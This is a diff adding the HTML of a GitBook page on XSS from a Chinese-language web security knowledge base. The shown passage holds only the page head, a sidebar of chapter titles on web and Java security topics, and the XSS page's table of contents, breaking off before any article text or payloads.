@@ -1,0 +1,2288 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>02.XSS · Aaron 知识库</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        <meta name="author" content="aaron">
+        
+        
+    
+    <link rel="stylesheet" href="../../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-search-plus/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-page-treeview/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-lightbox/css/lightbox.min.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-donate/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-code/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-pageview-count/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-ancre-navigation/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-insert-logo/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="../03.CSRF/" />
+    
+    
+    <link rel="prev" href="../01.SQLi/ThinkPHP_3.2.3_SQLi.html" />
+    
+
+    
+        <link rel="shortcut icon" href='../../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="bookmark" href='../../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="apple-touch-icon" href='../../../README.assets/favicon.ico'>
+    
+    
+        
+        <link rel="apple-touch-icon" sizes="120x120" href="../../../README.assets/favicon.ico">
+        
+        <link rel="apple-touch-icon" sizes="180x180" href="../../../README.assets/favicon.ico">
+        
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../../">
+            
+                <a href="../../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" >
+            
+                <span>
+            
+                    
+                    01.WEB安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1" data-path="../01.SQLi/">
+            
+                <a href="../01.SQLi/">
+            
+                    
+                    01.SQLi
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1" data-path="../01.SQLi/MSSQL/MSSQL.html">
+            
+                <a href="../01.SQLi/MSSQL/MSSQL.html">
+            
+                    
+                    MSSQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.1.1" data-path="../01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html">
+            
+                <a href="../01.SQLi/MSSQL/MSSQL常见符号函数符号归类.html">
+            
+                    
+                    MSSQL常见符号函数符号归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.2" data-path="../01.SQLi/MSSQL/MSSQL注入基础.html">
+            
+                <a href="../01.SQLi/MSSQL/MSSQL注入基础.html">
+            
+                    
+                    MSSQL注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.1.3" data-path="../01.SQLi/MSSQL/常见防御手段及绕过方式.html">
+            
+                <a href="../01.SQLi/MSSQL/常见防御手段及绕过方式.html">
+            
+                    
+                    常见防御手段及绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2" data-path="../01.SQLi/MYSQL/MYSQL.html">
+            
+                <a href="../01.SQLi/MYSQL/MYSQL.html">
+            
+                    
+                    MYSQL
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.2.1" data-path="../01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html">
+            
+                <a href="../01.SQLi/MYSQL/MYSQL常见符号函数语句归类.html">
+            
+                    
+                    MYSQL常见符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.2.2" data-path="../01.SQLi/MYSQL/MySQL注入基础.html">
+            
+                <a href="../01.SQLi/MYSQL/MySQL注入基础.html">
+            
+                    
+                    MySQL注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3" data-path="../01.SQLi/Oracle/Oracle.html">
+            
+                <a href="../01.SQLi/Oracle/Oracle.html">
+            
+                    
+                    Oracle
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.3.1" data-path="../01.SQLi/Oracle/Oracle常用符号函数语句归类.html">
+            
+                <a href="../01.SQLi/Oracle/Oracle常用符号函数语句归类.html">
+            
+                    
+                    Oracle常用符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.3.2" data-path="../01.SQLi/Oracle/Oracle注入基础.html">
+            
+                <a href="../01.SQLi/Oracle/Oracle注入基础.html">
+            
+                    
+                    Oracle注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4" data-path="../01.SQLi/Postgresql/Postgresql.html">
+            
+                <a href="../01.SQLi/Postgresql/Postgresql.html">
+            
+                    
+                    Postgresql
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.1.4.1" data-path="../01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html">
+            
+                <a href="../01.SQLi/Postgresql/Postgresql常用符号函数语句归类.html">
+            
+                    
+                    Postgresql常用符号函数语句归类
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.2" data-path="../01.SQLi/Postgresql/Postgresql注入基础.html">
+            
+                <a href="../01.SQLi/Postgresql/Postgresql注入基础.html">
+            
+                    
+                    Postgresql注入基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.4.3" data-path="../01.SQLi/Postgresql/常见防御手段及绕过方式.html">
+            
+                <a href="../01.SQLi/Postgresql/常见防御手段及绕过方式.html">
+            
+                    
+                    常见防御手段及绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.5" data-path="../01.SQLi/SQL注入之伪静态页面布尔注入.html">
+            
+                <a href="../01.SQLi/SQL注入之伪静态页面布尔注入.html">
+            
+                    
+                    SQL注入之伪静态页面布尔注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.1.6" data-path="../01.SQLi/ThinkPHP_3.2.3_SQLi.html">
+            
+                <a href="../01.SQLi/ThinkPHP_3.2.3_SQLi.html">
+            
+                    
+                    ThinkPHP_3.2.3_SQLi
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter active" data-level="1.2.2" data-path="./">
+            
+                <a href="./">
+            
+                    
+                    02.XSS
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.3" data-path="../03.CSRF/">
+            
+                <a href="../03.CSRF/">
+            
+                    
+                    03.CSRF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.3.1" data-path="../03.CSRF/CSRF绕过Referer技巧.html">
+            
+                <a href="../03.CSRF/CSRF绕过Referer技巧.html">
+            
+                    
+                    CSRF绕过Referer技巧
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.4" data-path="../04.OS注入/">
+            
+                <a href="../04.OS注入/">
+            
+                    
+                    04.OS注入
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5" >
+            
+                <span>
+            
+                    
+                    05.文件操作
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.5.1" data-path="../05.文件操作/文件上传.html">
+            
+                <a href="../05.文件操作/文件上传.html">
+            
+                    
+                    文件上传
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.5.2" data-path="../05.文件操作/文件包含.html">
+            
+                <a href="../05.文件操作/文件包含.html">
+            
+                    
+                    文件包含
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6" data-path="../06.SSRF/">
+            
+                <a href="../06.SSRF/">
+            
+                    
+                    06.SSRF
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.6.1" data-path="../06.SSRF/SSRF示例（weblogic_SSRF）.html">
+            
+                <a href="../06.SSRF/SSRF示例（weblogic_SSRF）.html">
+            
+                    
+                    SSRF示例（weblogic_SSRF）
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.6.2" data-path="../06.SSRF/SSRF绕过方式.html">
+            
+                <a href="../06.SSRF/SSRF绕过方式.html">
+            
+                    
+                    SSRF绕过方式
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.7" data-path="../07.XXE/">
+            
+                <a href="../07.XXE/">
+            
+                    
+                    07.XXE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.8" data-path="../08.SSTI/">
+            
+                <a href="../08.SSTI/">
+            
+                    
+                    08.SSTI
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9" >
+            
+                <span>
+            
+                    
+                    09.反序列化
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.9.1" data-path="../09.反序列化/Java序列化与反序列化.html">
+            
+                <a href="../09.反序列化/Java序列化与反序列化.html">
+            
+                    
+                    Java序列化与反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.9.2" data-path="../09.反序列化/PHP反序列化.html">
+            
+                <a href="../09.反序列化/PHP反序列化.html">
+            
+                    
+                    PHP反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.10" >
+            
+                <span>
+            
+                    
+                    10.权限维持
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.10.1" data-path="../10.权限维持/Web_权限维持.html">
+            
+                <a href="../10.权限维持/Web_权限维持.html">
+            
+                    
+                    Web_权限维持
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11" >
+            
+                <span>
+            
+                    
+                    11.其他
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.2.11.1" data-path="../11.其他/01.WAF绕过通用思路.html">
+            
+                <a href="../11.其他/01.WAF绕过通用思路.html">
+            
+                    
+                    01.WAF绕过通用思路
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.2" data-path="../11.其他/02.蚁剑RSA加密绕过检测.html">
+            
+                <a href="../11.其他/02.蚁剑RSA加密绕过检测.html">
+            
+                    
+                    02.蚁剑RSA加密绕过检测
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.3" data-path="../11.其他/03.GitHub云扫描器.html">
+            
+                <a href="../11.其他/03.GitHub云扫描器.html">
+            
+                    
+                    03.GitHub云扫描器
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.4" data-path="../11.其他/04.JavaScript原型链污染.html">
+            
+                <a href="../11.其他/04.JavaScript原型链污染.html">
+            
+                    
+                    04.JavaScript原型链污染
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.5" data-path="../11.其他/05.phpfilter协议利用.html">
+            
+                <a href="../11.其他/05.phpfilter协议利用.html">
+            
+                    
+                    05.phpfilter协议利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.6" data-path="../11.其他/06.单点登录SSO原理.html">
+            
+                <a href="../11.其他/06.单点登录SSO原理.html">
+            
+                    
+                    06.单点登录SSO原理
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.7" data-path="../11.其他/07.任意用户密码重置的10种姿势.html">
+            
+                <a href="../11.其他/07.任意用户密码重置的10种姿势.html">
+            
+                    
+                    07.任意用户密码重置的10种姿势
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2.11.8" data-path="../11.其他/08.网页接口加密暴破.html">
+            
+                <a href="../11.其他/08.网页接口加密暴破.html">
+            
+                    
+                    08.网页接口加密暴破
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3" >
+            
+                <span>
+            
+                    
+                    02.JAVA安全
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.3.1" data-path="../../02.JAVA安全/01.Java_JVM内存模型.html">
+            
+                <a href="../../02.JAVA安全/01.Java_JVM内存模型.html">
+            
+                    
+                    01.Java_JVM内存模型
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.2" data-path="../../02.JAVA安全/02.Java_面向对象.html">
+            
+                <a href="../../02.JAVA安全/02.Java_面向对象.html">
+            
+                    
+                    02.Java_面向对象
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.3" data-path="../../02.JAVA安全/03.Java反射机制.html">
+            
+                <a href="../../02.JAVA安全/03.Java反射机制.html">
+            
+                    
+                    03.Java反射机制
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.4" data-path="../../02.JAVA安全/04.Java序列化与反序列化.html">
+            
+                <a href="../../02.JAVA安全/04.Java序列化与反序列化.html">
+            
+                    
+                    04.Java序列化与反序列化
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.5" data-path="../../02.JAVA安全/05.RMI基础.html">
+            
+                <a href="../../02.JAVA安全/05.RMI基础.html">
+            
+                    
+                    05.RMI基础
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.6" data-path="../../02.JAVA安全/06.JNDI注入原理及利用.html">
+            
+                <a href="../../02.JAVA安全/06.JNDI注入原理及利用.html">
+            
+                    
+                    06.JNDI注入原理及利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.7" data-path="../../02.JAVA安全/07.OGNL表达式.html">
+            
+                <a href="../../02.JAVA安全/07.OGNL表达式.html">
+            
+                    
+                    07.OGNL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.8" data-path="../../02.JAVA安全/08.EL表达式.html">
+            
+                <a href="../../02.JAVA安全/08.EL表达式.html">
+            
+                    
+                    08.EL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.9" data-path="../../02.JAVA安全/09.SpEL表达式.html">
+            
+                <a href="../../02.JAVA安全/09.SpEL表达式.html">
+            
+                    
+                    09.SpEL表达式
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.10" data-path="../../02.JAVA安全/10.Tomcat内存马基础入门.html">
+            
+                <a href="../../02.JAVA安全/10.Tomcat内存马基础入门.html">
+            
+                    
+                    10.Tomcat内存马基础入门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.11" data-path="../../02.JAVA安全/11.Spring框架内存马入门.html">
+            
+                <a href="../../02.JAVA安全/11.Spring框架内存马入门.html">
+            
+                    
+                    11.Spring框架内存马入门
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.12" data-path="../../02.JAVA安全/12.Shiro550分析.html">
+            
+                <a href="../../02.JAVA安全/12.Shiro550分析.html">
+            
+                    
+                    12.Shiro550分析
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.13" data-path="../../02.JAVA安全/13.Shiro550无文件内存马.html">
+            
+                <a href="../../02.JAVA安全/13.Shiro550无文件内存马.html">
+            
+                    
+                    13.Shiro550无文件内存马
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.14" data-path="../../02.JAVA安全/14.Tomcat内存马无文件攻击.html">
+            
+                <a href="../../02.JAVA安全/14.Tomcat内存马无文件攻击.html">
+            
+                    
+                    14.Tomcat内存马无文件攻击
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.15" data-path="../../02.JAVA安全/15.Jira_CVE2020-36239_RCE.html">
+            
+                <a href="../../02.JAVA安全/15.Jira_CVE2020-36239_RCE.html">
+            
+                    
+                    15.Jira_CVE2020-36239_RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.16" data-path="../../02.JAVA安全/16.fastJson反序列化原理及利用.html">
+            
+                <a href="../../02.JAVA安全/16.fastJson反序列化原理及利用.html">
+            
+                    
+                    16.fastJson反序列化原理及利用
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.17" data-path="../../02.JAVA安全/17.Spring-Core_RCE.html">
+            
+                <a href="../../02.JAVA安全/17.Spring-Core_RCE.html">
+            
+                    
+                    17.Spring-Core_RCE
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.18" data-path="../../02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html">
+            
+                <a href="../../02.JAVA安全/18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链.html">
+            
+                    
+                    18.JNDI注入之com.sun.rowset.JdbcRowSetImpl利用链
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >02.XSS</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div class="search-plus" id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><ul><li><span class="title-icon "></span><a href="#&#x5B9A;&#x4E49;"><b>1.1. </b>&#x5B9A;&#x4E49;</a></li><ul><li><span class="title-icon "></span><a href="#&#x53CD;&#x5C04;&#x578B;xss"><b>1.1.1. </b>&#x53CD;&#x5C04;&#x578B;XSS</a></li><li><span class="title-icon "></span><a href="#&#x5B58;&#x50A8;&#x578B;xss"><b>1.1.2. </b>&#x5B58;&#x50A8;&#x578B;XSS</a></li><li><span class="title-icon "></span><a href="#dom&#x578B;xss"><b>1.1.3. </b>DOM&#x578B;XSS</a></li></ul><li><span class="title-icon "></span><a href="#xss-&#x7279;&#x5F81;"><b>1.2. </b>XSS &#x7279;&#x5F81;</a></li><li><span class="title-icon "></span><a href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;"><b>1.3. </b>XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;</a></li><li><span class="title-icon "></span><a href="#xss-&#x653B;&#x51FB;&#x9762;"><b>1.4. </b>XSS &#x653B;&#x51FB;&#x9762;</a></li><ul><li><span class="title-icon "></span><a href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;"><b>1.4.1. </b>&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</a></li><li><span class="title-icon "></span><a href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;"><b>1.4.2. </b>&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</a></li><li><span class="title-icon "></span><a href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;"><b>1.4.3. </b>&#x767D;&#x76D2;&#x6D4B;&#x8BD5;(&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;)</a></li></ul><li><span class="title-icon "></span><a href="#xss-&#x76F8;&#x5173;payload"><b>1.5. </b>XSS &#x76F8;&#x5173;payload</a></li><ul><li><span class="title-icon "></span><a href="#&#x6807;&#x7B7E;&#x7C7B;"><b>1.5.1. </b>&#x6807;&#x7B7E;&#x7C7B;</a></li><li><span class="title-icon "></span><a href="#&#x8868;&#x5355;&#x7C7B;"><b>1.5.2. </b>&#x8868;&#x5355;&#x7C7B;</a></li><li><span class="title-icon "></span><a href="#&#x4E8B;&#x4EF6;&#x7C7B;"><b>1.5.3. </b>&#x4E8B;&#x4EF6;&#x7C7B;</a></li></ul><li><span class="title-icon "></span><a href="#xss&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;"><b>1.6. </b>XSS&#x7684;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;</a></li><ul><li><span class="title-icon "></span><a href="#javascript&#x4F2A;&#x534F;&#x8BAE;"><b>1.6.1. </b>JavaScript&#x4F2A;&#x534F;&#x8BAE;</a></li><li><span class="title-icon "></span><a href="#&#x7F16;&#x7801;"><b>1.6.2. </b>&#x7F16;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x53CC;&#x5199;"><b>1.6.3. </b>&#x53CC;&#x5199;</a></li><li><span class="title-icon "></span><a href="#&#x5927;&#x5C0F;&#x5199;"><b>1.6.4. </b>&#x5927;&#x5C0F;&#x5199;</a></li><li><span class="title-icon "></span><a href="#&#x4E00;&#x4E9B;&#x6848;&#x4F8B;"><b>1.6.5. </b>&#x4E00;&#x4E9B;&#x6848;&#x4F8B;</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;"><b>1.7. </b>&#x53C2;&#x8003;&#x94FE;&#x63A5;</a></li></ul></ul></div><a href="#" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><ul>
+<li><div><a href="#&#x5B9A;&#x4E49;">&#x5B9A;&#x4E49;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x53CD;&#x5C04;&#x578B;xss">&#x53CD;&#x5C04;&#x578B;XSS</a><i></i></div></li>
+<li><div><a href="#&#x5B58;&#x50A8;&#x578B;xss">&#x5B58;&#x50A8;&#x578B;XSS</a><i></i></div></li>
+<li><div><a href="#dom&#x578B;xss">DOM&#x578B;XSS</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#xss-&#x7279;&#x5F81;">XSS &#x7279;&#x5F81;</a><i></i></div></li>
+<li><div><a href="#xss&#x4E0E;csrf&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;">XSS&#x4E0E;CSRF&#x7684;&#x533A;&#x522B;&#xFF08;&#x9762;&#x8BD5;&#x5E38;&#x95EE;&#xFF09;</a><i></i></div></li>
+<li><div><a href="#xss-&#x653B;&#x51FB;&#x9762;">XSS &#x653B;&#x51FB;&#x9762;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;">&#x9ED1;&#x76D2;&#x6D4B;&#x8BD5;</a><i></i></div></li>
+<li><div><a href="#&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;">&#x5E38;&#x89C1;&#x4E1A;&#x52A1;&#x573A;&#x666F;</a><i></i></div></li>
+<li><div><a href="#&#x767D;&#x76D2;&#x6D4B;&#x8BD5;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;">&#x767D;&#x76D2;&#x6D4B;&#x8BD5;(&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;)</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#xss-&#x76F8;&#x5173;payload">XSS &#x76F8;&#x5173;payload</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x6807;&#x7B7E;&#x7C7B;">&#x6807;&#x7B7E;&#x7C7B;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#script">script</a><i></i></div></li>
+<li><div><a href="#svg">svg</a><i></i></div></li>
+<li><div><a href="#img">img</a><i></i></div></li>
+<li><div><a href="#body">body</a><i></i></div></li>
+<li><div><a href="#video">video</a><i></i></div></li>
+<li><div><a href="#style">style</a><i></i></div></li>
+</ul></li>
+<li><div><a href="#&#x8868;&#x5355;&#x7C7B;">&#x8868;&#x5355;&#x7C7B;</a><i></i></div></li>
+<li><div><a href="#&#x4E8B;&#x4EF6;&#x7C7B;">&#x4E8B;&#x4EF6;&#x7C7B;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
+<ul>
+<li><div><a href="#&#x9F20;&#x6807;&#x4E8B;&#x4EF6;">&#x9F20;&#x6807;&#x4E8B;&#x4EF6;</a><i></i></div></li>
